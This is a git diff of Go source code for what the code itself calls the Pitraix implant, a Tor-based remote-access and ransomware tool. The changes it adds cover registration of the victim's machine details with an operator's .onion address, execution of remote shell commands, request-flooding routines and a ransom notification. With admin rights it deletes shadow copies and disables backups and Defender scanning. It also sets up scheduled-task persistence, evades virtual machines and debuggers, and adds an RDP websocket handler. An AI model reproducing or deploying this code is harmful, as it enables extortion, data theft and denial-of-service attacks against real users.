 				//	out += string(response) + "\n"
 				}
 			}(iv)
+
 		} else {
 			go func(ivspl []string) {
 				response, err := postRequest("http://" + ivspl[0] + ".onion", []byte(ivspl[1]), true, 25)
 				fmt.Println(string(response), err)
 				// out += string(response) + "\n"
+
 			}(ivspl)
+
 		}
+
 		out = strings.TrimSpace(out)
 
-	
 	case "postreq":
 		ivspl := strings.Split(iv, " ")
 		if len(ivspl) < 3 {
 			out = "Error: iv length is not 3 or higher"
+
 		} else {
 			amount, err := strconv.Atoi(ivspl[0])
+
 			if err != nil {
 				out = "Error: not int" + err.Error()
+
 			} else {
 				payload := []byte(iv[len(ivspl[1]) + len(ivspl[0]) + 1:])
 
@@ -628,6 +1236,7 @@ func doInstru(ic, iv string) string {
 						x, err := postRequest(target, payload, false, -1)
 						fmt.Println(string(x), err, i)
 					}
+
 				}(ivspl[1], amount, payload)
 
 				out = "Sending"
@@ -640,16 +1249,20 @@ func doInstru(ic, iv string) string {
 		ivspl := strings.Split(iv, " ")
 		if len(ivspl) != 2 {
 			out = "Error: iv length is not 2"
+
 		} else {
 			amount, err := strconv.Atoi(ivspl[0])
+
 			if err != nil {
 				out = "Error: not int" + err.Error()
+
 			} else {
 				go func(target string, amount int) {
 					for i := 0; i < amount; i++ {
 						x, err := getRequest(target, false, -1)
 						fmt.Println(string(x), err, i)
 					}
+
 				}(ivspl[1], amount)
 
 				out = "Sending"
@@ -658,6 +1271,64 @@ func doInstru(ic, iv string) string {
 
 		}
 
+	case "module":
+		ivspl := strings.Split(iv, " ")
+		if len(ivspl) != 2 {
+			out = "Error: iv length is not 2"
+			
+		} else {
+			amount, err := strconv.Atoi(ivspl[0])
+
+			if err != nil {
+				out = "Error: not int" + err.Error()
+
+			} else {
+				go func(target string, amount int) {
+					for i := 0; i < amount; i++ {
+						x, err := getRequest(target, false, -1)
+						fmt.Println(string(x), err, i)
+					}
+					
+				}(ivspl[1], amount)
+
+				out = "Sending"
+
+			}
+
+		}
+		
+	case "crashnearby":
+		/*
+			This only works with old laptops and that don't have SSDs
+			Might not always work
+			
+			82.4 - 84.4 HZ 3 times per 20 seconds then 
+			5300 - 5500 Hz 200 times per second for 30 seconds
+		*/
+
+		go func() {
+			for i := 0; i < 20; i++ {
+				for x := 0; x < 3; x++ {
+					rq := 82 + x
+					go func(x int) {
+						beepSound(x, 200)
+					}(rq)
+				}
+				time.Sleep(1 * time.Second)
+			} 
+
+			for i := 0; i < 30; i++ {
+				for x := 0; x < 200; x++ {
+					rq := 5300 + x
+					go func(x int) {
+						beepSound(x, 200)
+					}(rq)
+				}
+				time.Sleep(1 * time.Second)
+			} 
+		}()
+
+	
 	case "notify":
 		ivspl := strings.Split(iv, " ")
 		if len(ivspl) < 2 {
@@ -734,10 +1405,12 @@ func doInstru(ic, iv string) string {
 				}()
 
 				go func(coin string) {
-					time.Sleep(5 * time.Second)
-					doInstru("shell", "notepad " + mainDrive + "\\" + "Users\\" + username + "\\Desktop\\READ_ME_25.txt")
+					notif := toast.Notification{AppID: "Pitraix", Title: "pitraix", Message: "All your files have been locked. Please follow instructions on how to get them back", }
+					notif.Push()
+					time.Sleep(6 * time.Second)
+					doInstru("shell", "notepad.exe " + mainDrive + "\\" + "Users\\" + username + "\\Desktop\\READ_ME_25.txt", true)
 					time.Sleep(165)
-					doInstru("shell", "start chrome \"https://www.google.com/search?q=How to buy " + coin + "\"")
+					doInstru("shell", "start chrome \"https://www.google.com/search?q=How to buy " + coin + "\"", true)
 
 				}(ivspl[1])
 
@@ -1038,11 +1711,11 @@ func getMachineInfo() (string, int, string, string, int, string, string, string)
 		arch = 2
 	}
 
-	osVariant = strings.TrimSpace(doInstru("shell", "ver"))
+	osVariant = strings.TrimSpace(doInstru("shell", "ver", true))
 	kernelVersion = osVariant[19:len(osVariant) - 1]
 	//osVariant = strings.TrimSpace(osVariant[8:])
 	
-	VendorInfo := strings.TrimSpace(doInstru("shell", "wmic computersystem get manufacturer, model,name"))
+	VendorInfo := strings.TrimSpace(doInstru("shell", "wmic computersystem get manufacturer, model,name", true))
 	VendorInfoField := strings.Fields(VendorInfo)
 	machineModel = VendorInfoField[len(VendorInfoField) - 2]
 	hostname = VendorInfoField[len(VendorInfoField) - 1]
@@ -1056,7 +1729,7 @@ func getMachineInfo() (string, int, string, string, int, string, string, string)
 		machineType = 1
 	}
 
-	meminfo_Raw := strings.Fields(strings.TrimSpace(doInstru("shell", "wmic computersystem get totalphysicalmemory")))
+	meminfo_Raw := strings.Fields(strings.TrimSpace(doInstru("shell", "wmic computersystem get totalphysicalmemory", true)))
 	memory = meminfo_Raw[1]
 
 
@@ -1081,6 +1754,7 @@ func vmCheck(userHostname, cpuVendor, machineVendor, machineModel string) {
 
 	}
 	if vmCPU[cpuVendor] || machineVendor == "innotek GmbH" || machineModel == "VirtualBox" {
+		fmt.Println("VM Detected")
 		os.Exit(0) // you could change this to something more sneaky
 	}
 }
@@ -1144,31 +1818,112 @@ func IsLower(s string) bool {
     return true
 }
 
+func getMacAddr() (string, error) {
+	addrs, err := net.InterfaceAddrs()
+	if err != nil {
+		return "", err
+	}
+
+	for _, a := range addrs {
+		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
+			if strings.Contains(ipnet.IP.String(), ":") {
+				return ipnet.IP.String(), nil
+			}
+		}
+	}
+
+	return "", nil
+}
+
+func measureTime(m int, intptr *int) { // i know this sucks and useless. next relesae it will based on actual time
+	*intptr = m
+
+	// fmt.Println(intptr, *intptr, mtimep)
+	for {
+		if *intptr == 0 {
+			break
+		}
+		// fmt.Println(intptr, *intptr, &intptr)
+		*intptr = *intptr - 1 
+		time.Sleep(1 * time.Second)
+	}
+}
+
+func screenshotBytes() []byte {
+	img, _ := captureScreen()	
+	buff := new(bytes.Buffer)
+	jpeg.Encode(buff, img, nil)
+	return buff.Bytes()
+
+
+}
 
 func main() {
+	// x := screenshotBytes()
+	// // fmt.Println(x)
+	
+	// f, _ := os.Create("ss.jpeg")
+	// f.Write(x)
+	// f.Close()
+	
+	// connection, err := net.Dial(SERVER_TYPE, "127.0.0.1:123")
+	// if err != nil {
+	// 	fmt.Println("failed 2 connect", err)
+	// }
+
+	// _, err = connection.Write([]byte("ppp"))
+	// buffer := make([]byte, 1024)
+	// mLen, err := connection.Read(buffer)
+	// if err != nil {
+	// 	fmt.Println("Error reading:", err)
+	// }
+	// fmt.Println("Received: ", string(buffer[:mLen]))
+	// defer connection.Close()
+
+	// time.Sleep(10000 * time.Second)
+
+	// os.Exit(0) // Debug
+
+
+	// fmt.Println(antiVirus)
+	// fmt.Println(strings.Split(strings.TrimSpace(doInstru("shell", "wmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List", true)), "="), len(strings.Split(strings.TrimSpace(doInstru("shell", "wmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List", true)), "=")))
+
 	// raw_OPEncryptionKeyPEM := strings.TrimSpace(raw_raw_OPEncryptionKeyPEM)
+
 	if IsUpper(agentAddress) || IsUpper(raw_OPEncryptionKeyPEM){
 		fmt.Println("Be sure to run OPER before compiling!!", agentAddress, raw_OPEncryptionKeyPEM)
 		time.Sleep(10 * time.Second)
 		os.Exit(0)
 	}
 
-	fmt.Println(raw_OPEncryptionKeyPEM, agentAddress)
-	contactDate = time.Now().String() // strings.Replace(time.Now().String(), "-", "", -1)
+	// fmt.Println(raw_OPEncryptionKeyPEM, agentAddress)
+
+
+	go measureTime(3, &mtimep) 		  // this will catch a debugger
+
+	contactDate = time.Now().String() 
+
+	if mtimep == 0 {
+		fmt.Println("u can look at the source instead lmao")
+		os.Exit(69)
+	}
+
+	// strings.Replace(time.Now().String(), "-", "", -1)
 	// contactDate = contactDate[2:strings.Index(contactDate, ".")]
 	// contactDate = strings.Replace(contactDate, " ", "", -1)
 	// contactDate = strings.Replace(contactDate, ":", "", -1)
 	
 
-	// fmt.Println("addr:", agentAddress)
-	cpuinfo_raw := strings.TrimSpace(doInstru("shell", "wmic CPU get name, manufacturer")[18:]) // "Intel(R) Core(TM) i5-4590 CPU @ 3.30GHz" // cpuInfo_Split[1] // fix
+	// idk := doInstru("shell", "wmic CPU get name, manufacturer", true) // [18:]
+
+	cpuinfo_raw := strings.TrimSpace(doInstru("shell", "wmic CPU get name, manufacturer", true)[18:]) // [18:])
 	cpuinfo_split := strings.Fields(cpuinfo_raw)
 	cpu := strings.TrimSpace(cpuinfo_raw[len(cpuinfo_split[0]):])
 	cpuVendor := cpuinfo_split[0]
 
 	userHostname, machineType, osVariant, kernelVersion, archComp, machineVendor, machineModel, memory := getMachineInfo()
 	// fmt.Println(userHostname, osVariant, kernelVersion, arch, machineVendor, machineModel)
-	
+
 	if antiVM_Enabled == true {
 		vmCheck(userHostname, cpuVendor, machineVendor, machineModel)
 	}
@@ -1195,10 +1950,18 @@ func main() {
 	if len(tor_FolderName) > 30 {
 		tor_FolderName = tor_FolderName[:25]
 	}
+	
+
+	// go measureTime(3, &mtimep)
+	// time.Sleep(2 * time.Second)
 
 	rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + cpu + "VOWLLA" + userHomeDIR + username ))))
 	locAES_Key = random_Bytes(32, false)
-
+	
+	// if mtimep == 0 {
+	// 	fmt.Println("i guess u really want to huh")
+	// 	os.Exit(69)
+	// }
 	// firstTime, _ := cft.updateConf(locAES_Key, cft.AES_Key, contactDate) //, username, cpu, cpuVendor, userHomeDIR)
 
 	/*
@@ -1206,12 +1969,11 @@ func main() {
 	*/
 
 	pointerPaths := nonPrivPaths
-	isadmin_const := isadmin()
 	if isadmin_const {
-		pointerPaths = PrivPaths
-		doInstru("shell", "taskkill /fi \"Services eq VSS\" /F") // Disables Volume Shadow Copy
-		doInstru("shell", "wbadmin disable backup -quiet") // Disables backups
-		doInstru("shell", "taskkill /f /im OneDrive.exe") // kills onedrive
+		pointerPaths = privPaths
+		doInstru("shell", "taskkill /fi \"Services eq VSS\" /F", true) // Disables Volume Shadow Copy
+		doInstru("shell", "wbadmin disable backup -quiet", true) // Disables backups
+		doInstru("shell", "taskkill /f /im OneDrive.exe", true) // kills onedrive
 	}
 	rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + "PRRFORVPRIVLPERSDFTN" + cpu + userHomeDIR + username ))))
 	pitraix_FilePath = filepath.Join(pointerPaths[rdmod.Intn(len(pointerPaths) - 1)], pitraix_FilePath)
@@ -1248,12 +2010,16 @@ func main() {
 		// time.Sleep(time.Second * 5)
 		if isadmin_const {
 			// doInstru("shell", `schtasks.exe /CREATE /SC ONLOGON /TN "` + pitraix_taskName + `" /TR "` + pitraix_FilePath + `" /RL HIGHEST /F`)
-			doInstru("shell", fmt.Sprintf("%s\\Windows\\System32\\schtasks.exe /CREATE /SC ONLOGON /TN %s /TR %s /RL HIGHEST /F", mainDrive ,pitraix_taskName, pitraix_FilePath))
+			doInstru("shell", fmt.Sprintf("%s\\Windows\\System32\\schtasks.exe /CREATE /SC ONLOGON /TN %s /TR %s /RL HIGHEST /F", mainDrive ,pitraix_taskName, pitraix_FilePath), true)
 			// fmt.Println("admin!", out)
+
+			doInstru("shell", "powershell.exe -Command Add-MpPreference -ExclusionPath " + tmpFold, true)
+
 		} else {
-			doInstru("shell", fmt.Sprintf("%s\\Windows\\System32\\schtasks.exe /CREATE /SC DAILY /TN %s /TR %s /F", mainDrive, pitraix_taskName, pitraix_FilePath))
+			doInstru("shell", fmt.Sprintf("%s\\Windows\\System32\\schtasks.exe /CREATE /SC DAILY /TN %s /TR %s /F", mainDrive, pitraix_taskName, pitraix_FilePath), true)
 			// fmt.Println("no :(", out)
 		}
+
 	}
 
 
@@ -1264,7 +2030,7 @@ func main() {
 		cft.ContactD = contactDate
 		cft.Logs = map[string][]string{"1": {"firstTime", "Created config file ", contactDate}}
 		cft.Events = map[string][]string{"1": {"firstTime", "Opened implant", contactDate}}
-		cft.Modules = map[string][]string{"0": {}}
+		cft.Modules = map[string][]string{"IGNORED": {}}
 		cft.RegTmp  = []string{}
 		cft.RoutesH = []string{}
 		cft.Register = false
@@ -1314,6 +2080,10 @@ func main() {
 			"crack",
 			"engineer",
 			"spam",
+			"spanish",
+			"russia",
+			"hebrew",
+			"yiddish",
 			"log",
 			"i2p",
 			"freenet",
@@ -1345,7 +2115,6 @@ func main() {
 			"c#",
 			"binary",
 			"java",
-			"javascript",
 			"golang",
 			"html",
 			"css",
@@ -1368,6 +2137,7 @@ func main() {
 			"shi",
 			"se",
 			"dic",
+			"pen",
 			"coc",
 			"pus",
 			"as",
@@ -1392,22 +2162,15 @@ func main() {
 			"hard",
 			"soft",
 			"bre",
+			"adios",
 			"straight",
 			"girl",
 			"fur",
 			"cub",
 			"prostitut",
-			"mom",
-			"mother",
-			"dad",
-			"father",
-			"sis",
-			"brother",
-			"sibling",
-			"uncle",
-			"aunt",
-			"cousin",
-			"al qaeda",
+			"al-",
+			"el-",
+			"qaeda",
 			"isi",
 			"islamic",
 			"ji",
@@ -1421,24 +2184,29 @@ func main() {
 			"www.",
 			"world",
 			"would",
+			"shabbat",
+			"plan",
 			"white",
 			"black",
 			"je",
 			"nig",
 			"neg",
 			"war",
-			"revenge",
+			"rever",
 			"grudge",
 			"blood",
 			"fa",
 			"hate",
 			"iraq",
+			"habib",
+			"kernel",
 			"syria",
+			"shalom",
 			"flight",
-			"plan",
 			"drone",
 			"nuclear",
 			"nuke",
+			"num",
 			"bom",
 			"explos",
 			"sho",
@@ -1446,12 +2214,20 @@ func main() {
 			"glock",
 			"pistol",
 			"rifle",
-			"suicid",
+			"rights",
+			"constitution",
+			"law",
+			"atm",
+			"sub",
 			"weapon",
-			"kill",
-			"pathetic",
+			"east",
+			"mid",
+			"west",
+			"north",
+			"south",
 			"weak",
 			"strong",
+			"gang",
 			"crew",
 			"border",
 			"customs",
@@ -1460,25 +2236,34 @@ func main() {
 			"chemical",
 			"pro",
 			"betray",
-			"how to",
+			"how",
 			"manual",
 			"facebook",
+			"guard",
+			"knight",
 			"twitter",
 			"link",
+			"pathetic",
 			"youtube",
 			"google",
+			"kill",
 			"duckduckgo",
+			"ddg",
+			"startpage",
+			"yandex",
+			"image",
 			"resume",
 			"website",
 			"blog",
 			"site",
 			"game",
-			"admin",
 			"mod",
 			"onion",
 			"monero",
 			"bitcoin",
 			"ether",
+			"withdraw",
+			"hill",
 			"crypt",
 			"encrypt",
 			"sign",
@@ -1494,11 +2279,17 @@ func main() {
 			"problem",
 			"windows",
 			"unix",
+			"under",
 			"bsd",
 			"assembly",
+			"suicid",
 			"card",
+			"call",
 			"visit",
 			"email",
+			"mail",
+			"post",
+			"get",
 			"slack",
 			"irc",
 			"jabber",
@@ -1507,38 +2298,66 @@ func main() {
 			"element",
 			"client",
 			"user",
-			"blackmail",
 			"dark",
 			"deep",
 			"cyber",
+			"private",
 			"privacy",
+			"backdoor",
+			"tap",
 			"security",
+			"session",
+			"cookie",
+			"csrf",
+			"sql",
+			"inject",
 			"learn",
+			"block",
+			"ad",
+			"contain",
+			"cute",
+			"trace",
+			"track",
 			"teach",
 			"var",
+			"const",
+			"leave",
+			"daemon",
+			"stop",
+			"systemd",
+			"openrc",
+			"ublock",
 			"scam",
 			"http",
 			"bought",
 			"spread",
 			"profile",
 			"nord",
+			"broken",
+			"proton",
+			"server",
 			"express",
+			"extension",
+			"store",
+			"watch",
+			"install",
+			"uninstall",
 			"firefox",
 			"chrome",
 			"nsa",
 			"national",
 			"agency",
 			"fbi",
-			"addict",
 			"fed",
 			"cia",
-			"mossad",
-			"office",
+			"mossa",
+			"mountain",
 			"agent",
 			"operat",
-			"officer",
-			"bank",
+			"offic",
+			"ban",
 			"money",
+			"invite",
 			"cash",
 			"credit",
 			"debt",
@@ -1546,10 +2365,25 @@ func main() {
 			"cop",
 			"spy",
 			"deploy",
+			"mom",
+			"mother",
+			"dad",
+			"father",
+			"sis",
+			"sister",
+			"brother",
+			"sibling",
+			"mic",
+			"cam",
+			"tran",
+			"uncle",
+			"aunt",
+			"cousin",
+			"step",
 			"military",
 			"sector",
-			"lake city",
-			"quiet pill",
+			"lake",
+			"pill",
 			"spooks",
 			"jail",
 			"prison",
@@ -1582,7 +2416,11 @@ func main() {
 			"alcohol",
 			"xanax",
 			"mushroom",
+			"music",
+			"rock",
+			"sick",
 			"heroin",
+			"song",
 			"tar",
 			"fentanyl",
 			"coke",
@@ -1610,10 +2448,9 @@ func main() {
 			"tired",
 			"europe",
 			"latin",
+			"issue",
 			"old",
 			"america",
-			"north",
-			"south",
 			"africa",
 			"east",
 			"asia",
@@ -1633,11 +2470,15 @@ func main() {
 			"sleep",
 			"slept",
 			"bed",
+			"died",
+			"dead",
 			"love",
+			"near",
 			"like",
 			"dislike",
 			"scared",
 			"scary",
+			"lust",
 			"terrifying",
 			"anime",
 			"cartoon",
@@ -1645,15 +2486,26 @@ func main() {
 			"satan",
 			"god",
 			"hell",
+			"healt",
 			"heaven",
 			"tiktok",
 			"android",
-			"iphone",
+			"ip",
+			"electron",
 			"open",
 			"dog",
 			"cat",
+			"wolf",
+			"lion",
+			"adu",
+			"tiger",
+			"fav",
 			"noob",
 			"soccer",
+			"bash",
+			"isolate",
+			"utility",
+			"help",
 			"baseball",
 			"basketball",
 			"virign",
@@ -1662,18 +2514,26 @@ func main() {
 			"im",
 			"name",
 			"nick",
+			"hobb",
 			"wife",
+			"wives",
+			"divorce",
 			"house",
 			"home",
 			"apartment",
 			"garage",
 			"door",
 			"paid",
+			"payed",
 			"pay",
-			"dollar",
+			"doll",
 			"euro",
 			"free",
 			"holy",
+			"allah",
+			"budd",
+			"lord",
+			"saviour",
 		}
 
 
@@ -2062,6 +2922,7 @@ func main() {
 
 	hstAddress := setupTor(tor_FolderPath, torPort, tor_FolderName, &ipinfo_struct, false)
 	fmt.Println("Address", hstAddress)
+
 	if firstTime {
 		file, _ := os.Open(pitraix_FilePath) // pitraix_spreadPath)
 		fs, _ := file.Stat()
@@ -2088,6 +2949,9 @@ func main() {
 		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: false} // secure connection back
 	}
 
+
+	go runModules("onboot")
+
 	opPubEncryptionKeyProcessed, _ := ParseRsaPublicKeyFromPemStr(raw_OPEncryptionKeyPEM)
 	// opPubSigningKeyProcessed   , _ := x509.ParsePKCS1PublicKey(pemDec(raw_OPSigningKeyPEM).Bytes)
 
@@ -2096,27 +2960,37 @@ func main() {
 	// 	log("WARNING", "OPER signing key is same as encryption key! this is highly recommended against")
 	// }
 
-	// onetimeKey := base64.StdEncoding.EncodeToString(random_Bytes(32, true))
+	rdp_onetimeKey 		= hex.EncodeToString(random_Bytes(45, true))
+	browserS_onetimeKey = hex.EncodeToString(random_Bytes(45, true))
 
 	// first time register logic
+
 	encryptedMessage_register := RSA_OAEP_Encrypt(AES_Key, *opPubEncryptionKeyProcessed)
-	encrypted_registerData, nonce, _ := encrypt_AES([]byte(fmt.Sprintf(`{"Address": "%s", "Username": "%s", "CPU": "%s", "RAM": "%s", "IP": "%s", "Country": "%s", "City": "%s", "Hostname": "%s", "Chassis": %d, "OS": %d, "OSVar": "%s", "Kernel": "%s", "Arch": %d, "Vendor": "%s", "Model": "%s", "ContactD": "%s", "RasKey": "%s"}`, hstAddress, username, cpu, memory, ipinfo_struct.IP, ipinfo_struct.Country, ipinfo_struct.City, userHostname, machineType, osName, osVariant, kernelVersion, archComp, machineVendor, machineModel, contactDate, base64.StdEncoding.EncodeToString(random_Bytes(32, true)))), AES_Key)
+	encrypted_registerData, nonce, _ := encrypt_AES([]byte(fmt.Sprintf(`{"Address": "%s", "Username": "%s", "CPU": "%s", "RAM": "%s", "IP": "%s", "Country": "%s", "City": "%s", "Hostname": "%s", "Chassis": %d, "OS": %d, "OSVar": "%s", "Kernel": "%s", "Arch": %d, "Vendor": "%s", "Model": "%s", "ContactD": "%s", "AV": "%s", "MacAddr": "%s", "RasKey": "%s"}`, hstAddress, username, cpu, memory, ipinfo_struct.IP, ipinfo_struct.Country, ipinfo_struct.City, userHostname, machineType, osName, osVariant, kernelVersion, archComp, machineVendor, machineModel, contactDate, antiVirus, macAddr, base64.StdEncoding.EncodeToString(random_Bytes(32, true)))), AES_Key)
 	registerData := fmt.Sprintf("%s|%s|%s", encryptedMessage_register, base64.StdEncoding.EncodeToString(encrypted_registerData), base64.StdEncoding.EncodeToString(nonce))
+
+	if firstTime == true || cft.Register == false {
+		fmt.Println("Attempting to register with Agent", agentAddress)
+		log("Register", "Attempting to register with Agent: " + agentAddress) // + err.Error())
+	}
 
 	for {
 		fmt.Println("firstTime:", firstTime, "cft.Register:", cft.Register)
 		if firstTime == false && cft.Register == true {
 			fmt.Println("stopped")
 			break
+
 		}
 		
 		// log("Register", "Attempting to register with Agent: " + agentAddress)
 		fmt.Println("Attempting to register with Agent", agentAddress)
-		response, err := postRequest("http://" + agentAddress + ".onion", []byte(registerData), true, 25)	 
+		response, err := postRequest("http://" + agentAddress + ".onion/pitraix", []byte(registerData), true, 25)	 
+
 		if err != nil {
-			log("Register", "Error") // + err.Error())
-			// fmt.Println("Error contacting Agent to register. ", err)
+			// log("Register", "Error") // + err.Error())
+			fmt.Println("Error contacting Agent to register. ", err)
 			time.Sleep(2 * time.Second) // DEBUG Increase to 2-9 seconds via randomizer later
+
 		} else {
 			fmt.Println("Respone: ", string(response), err)
 
@@ -2129,6 +3003,7 @@ func main() {
 			// cft.updateConf(locAES_Key, cft.AES_Key, cft.ContactD) //, username, cpu, cpuVendor, userHomeDIR)
 			
 		}
+
 	}
 	
 	// normal cell setup
@@ -2141,12 +3016,27 @@ func main() {
 		for {
 			if *antiddosCounter == 0 {
 				time.Sleep(1 * time.Second)
+
 			} else {
 				time.Sleep(5 * time.Second)
 				*antiddosCounter = *antiddosCounter - 5
+
 			}
+
 		}
+
 	}(&antiddosCounter)
+	
+
+	fmt.Println("rdp_onetimeKey", rdp_onetimeKey)
+	fmt.Println("browserS_onetimeKey", browserS_onetimeKey)
+	
+	http.HandleFunc("/websocket" + rdp_onetimeKey, rdp)
+	
+	// http.HandleFunc("/websocket" + browserS_onetimeKey, snatchBrowsersData)
+
+
+
 
 	http.HandleFunc("/", func(writer http.ResponseWriter, req *http.Request) {
 		req.Body = http.MaxBytesReader(writer, req.Body, 3000) // if anything wrong, its prolly dis bitch
@@ -2154,76 +3044,126 @@ func main() {
 			// io.WriteString(writer, "")
 			log("Foreign - GET", "Received GET request")
 			fmt.Println("Got GET request! ", req.Body)
+
 		} else if req.Method == "POST" {
+
 			reqBody, _ := ioutil.ReadAll(req.Body)
+
 			if len(reqBody) > 0 && isASCII(string(reqBody)) {
+
 				dataSlice := strings.Split(string(reqBody), "|")
-				fmt.Println(dataSlice)
+				// fmt.Println(dataSlice)
 				if len(dataSlice) == 3 { // register
+
 					if antiddosCounter == 0 {
 						antiddosCounter = ddosCounter
 						confAsyncChn <- []string{"regtmp", string(reqBody)}
 						io.WriteString(writer, "1")
-					} else {
-						fmt.Println("anti ddos caught something", antiddosCounter, dataSlice)
-						go log("Foreign - POST", "anti ddos caught something! DataSlice: " + dataSlice[0] + "|" + dataSlice[1] + "|" + dataSlice[2])
-					}
-				} else if len(dataSlice) == 2 { // instrctuion
-					temp_decipher, _ := base64.StdEncoding.DecodeString(dataSlice[0])
-					temp_nonce   , _ := base64.StdEncoding.DecodeString(dataSlice[1])
-					fmt.Println(temp_decipher, temp_nonce) // , base64.StdEncoding.EncodeToString(cft.AES_Key))
-					if len(temp_nonce) != 12 {
-						go log("Foreign - POST", "Invalid nonce length: " + strconv.Itoa(len(temp_nonce)) + ". DataSlice: " + dataSlice[0] + " " + dataSlice[1])
-						fmt.Println("Invalid nonce length given!", len(temp_nonce), temp_nonce)
-					} else {
-						decipher, err := decrypt_AES(temp_decipher, temp_nonce, AES_Key)
-						if err != nil {
-							go log("Foreign - POST", "Error while decrypting cipher! DataSlice: " + dataSlice[0] + "|" + dataSlice[1] + "|" + dataSlice[2])
-						} else {
-							var instructions = []string{} // instruType
-							err := json.Unmarshal(decipher, &instructions)
-							if err != nil {
-								go log("Foreign - POST", "Error while unmarshalling! DataSlice: " + dataSlice[0] + "|" + dataSlice[1] + "|" + dataSlice[2])
-							} else {
-								var shouldLog bool = true
-								var final_output string
-								for index, instru := range instructions {
-									fmt.Println("INSTRUCTION:", index, instru)
-									instru_split := strings.Split(instru, " ")
-									if len(instru_split) == 0 {
-										fmt.Println("wtf?", index, instru)
-										go log("Foreign - POST", "Received ZERO INSTRUCTIONS: " + string(decipher))
-									} else {
-										if instru_split[0] == "ransom" || instru_split[0] == "decrypt" {
-											shouldLog = false
-										}
-										final_output += strings.TrimSpace(doInstru(instru_split[0], instru[len(instru_split[0]) + 1:])) + " <PiTrIaXMaGGi$N$9a1n>"
-									}
-								}
-								if shouldLog == true{
-									go log("Foreign - POST", "Received instructions: " + string(decipher))
-								}
-								fmt.Println("Received instructions:",err, len(instructions), string(decipher))
 
-								final_output = strings.TrimSpace(final_output) // [:len(final_output) - 2]
-								output_enc, nonce_enc, _ := encrypt_AES([]byte(final_output), AES_Key)
-								output_encode := fmt.Sprintf("%s|%s", base64.StdEncoding.EncodeToString(output_enc), base64.StdEncoding.EncodeToString(nonce_enc))
-								io.WriteString(writer, output_encode)
-							}
-						}
+					} else {
+						fmt.Println("Anti-DDos caught something", antiddosCounter, dataSlice)
+						go log("Foreign - POST", "Anti-DDos caught something DataSlice: " + dataSlice[0] + "|" + dataSlice[1] + "|" + dataSlice[2])
+
 					}
+					
+				} else if len(dataSlice) == 2 { // instrctuion
+
+					temp_decipher, err := base64.StdEncoding.DecodeString(dataSlice[0])
+					if err != nil {
+						go log("Foreign - POST", "Invalid base64 dataslice 0: " + dataSlice[0])
+						fmt.Println("Invalid base64 dataslice 0: ", dataSlice[0])
+
+					} else {
+
+						temp_nonce, err := base64.StdEncoding.DecodeString(dataSlice[1])
+						if err != nil {
+							go log("Foreign - POST", "Invalid base64 dataslice 1: " + dataSlice[1])
+							fmt.Println("Invalid base64 dataSlice 1: ", dataSlice[1])
+							
+						} else {
+							
+						
+							fmt.Println(temp_decipher, temp_nonce) // , base64.StdEncoding.EncodeToString(cft.AES_Key))
+
+							if len(temp_nonce) != 12 {
+								go log("Foreign - POST", "Invalid nonce length: " + strconv.Itoa(len(temp_nonce)) + ". DataSlice: " + dataSlice[0] + " " + dataSlice[1])
+								fmt.Println("Invalid nonce length given!", len(temp_nonce), temp_nonce)
+
+							} else {
+								decipher, err := decrypt_AES(temp_decipher, temp_nonce, AES_Key)
+								if err != nil {
+									go log("Foreign - POST", "Error while decrypting cipher! DataSlice: " + dataSlice[0] + "|" + dataSlice[1] + "|" + dataSlice[2])
+
+								} else {
+									var instructions = []string{} // instruType
+									err := json.Unmarshal(decipher, &instructions)
+
+									if err != nil {
+										go log("Foreign - POST", "Error while unmarshalling! DataSlice: " + dataSlice[0] + "|" + dataSlice[1] + "|" + dataSlice[2])
+
+									} else {
+										var shouldLog bool = true
+										var final_output string
+
+										for index, instru := range instructions {
+											fmt.Println("INSTRUCTION:", index, instru)
+											instru_split := strings.Split(instru, " ")
+											if len(instru_split) == 0 {
+												fmt.Println("wtf?", index, instru)
+												go log("Foreign - POST", "Received ZERO INSTRUCTIONS: " + string(decipher))
+
+											} else {
+												if instru_split[0] == "ransom" || instru_split[0] == "decrypt" || instru_split[0] == "selfdestruct" {
+													shouldLog = false
+
+												}
+												final_output += strings.TrimSpace(doInstru(instru_split[0], instru[len(instru_split[0]) + 1:], false)) + " <PiTrIaXMaGGi$N$9a1n>"
+
+											}
+										}
+
+
+										if shouldLog == true{
+											go log("Foreign - POST", "Received instructions: " + string(decipher))
+
+										}
+
+
+										fmt.Println("Received instructions:",err, len(instructions), string(decipher))
+
+										final_output = strings.TrimSpace(final_output) // [:len(final_output) - 2]
+
+										output_enc, nonce_enc, _ := encrypt_AES([]byte(final_output), AES_Key)
+										output_encode := fmt.Sprintf("%s|%s", base64.StdEncoding.EncodeToString(output_enc), base64.StdEncoding.EncodeToString(nonce_enc))
+										io.WriteString(writer, output_encode)
+
+									}
+
+								}
+							
+							}
+							
+						}
+
+					}
+
 				} else {
+
 					go log("Foreign - POST", "Received POST request without data length 2: " + strconv.Itoa(len(dataSlice)))
 					// fmt.Println("Got POST request without DataSlice 2! ", dataSlice, len(dataSlice))
+
 				}
+
 			} else {
 				go log("Foreign - POST", "Received POST request without valid data: " + string(reqBody))
 				fmt.Println("Got POST request without valid data! %v %v\n", reqBody, string(reqBody))
+
 			}
 			
 		} else {
 			go log("Foreign - UNKNOWN", "Received request of unknown method: " + req.Method)
 			fmt.Println("Hello Fake", req.Method)
+
 		}
 	})
 	fmt.Println(http.ListenAndServe("127.0.0.1:" + torPort, nil))
